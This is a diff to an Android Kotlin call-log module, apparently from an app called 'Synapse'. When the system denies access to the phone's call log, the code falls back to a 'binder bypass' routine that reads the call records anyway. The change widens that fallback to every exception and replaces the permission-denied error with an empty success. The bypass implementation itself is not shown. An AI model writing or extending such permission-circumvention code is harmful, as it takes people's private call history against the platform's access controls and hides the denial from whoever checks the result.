@@ -58,22 +58,22 @@ object CallLogModule {
                 calls = calls,
                 count = calls.size
             )
-        } catch (e: SecurityException) {
-            // ── Binder bypass fallback ──
-            Log.d("Synapse.CallLog", "ContentResolver denied, trying binder bypass...")
+        } catch (e: Exception) {
+            // ── Binder bypass fallback — catches SecurityException, RuntimeException, etc. ──
+            Log.d("Synapse.CallLog", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
             return try {
                 val binderCalls = PermissionBypass.readCallLogViaBinder(context, filter, count)
                 if (binderCalls.isNotEmpty()) {
-                    Log.d("Synapse.CallLog", "Binder bypass success: ${binderCalls.size} calls")
+                    Log.d("Synapse.CallLog", "Binder bypass SUCCESS: ${binderCalls.size} calls")
                     SynapseResponse.CallLogResponse(calls = binderCalls, count = binderCalls.size)
                 } else {
-                    SynapseResponse.ErrorResponse("calls:permission_denied:${e.message}", "calls")
+                    Log.d("Synapse.CallLog", "Binder bypass returned 0 calls")
+                    SynapseResponse.CallLogResponse(calls = emptyList(), count = 0)
                 }
             } catch (bp: Exception) {
-                SynapseResponse.ErrorResponse("calls:permission_denied_and_bypass_failed:${bp.message}", "calls")
+                Log.e("Synapse.CallLog", "Binder bypass FAILED: ${bp.message}", bp)
+                SynapseResponse.ErrorResponse("calls:bypass_failed:${bp.message}", "calls")
             }
-        } catch (e: Exception) {
-            SynapseResponse.ErrorResponse("calls:${e.message}", "calls")
         }
     }
 }
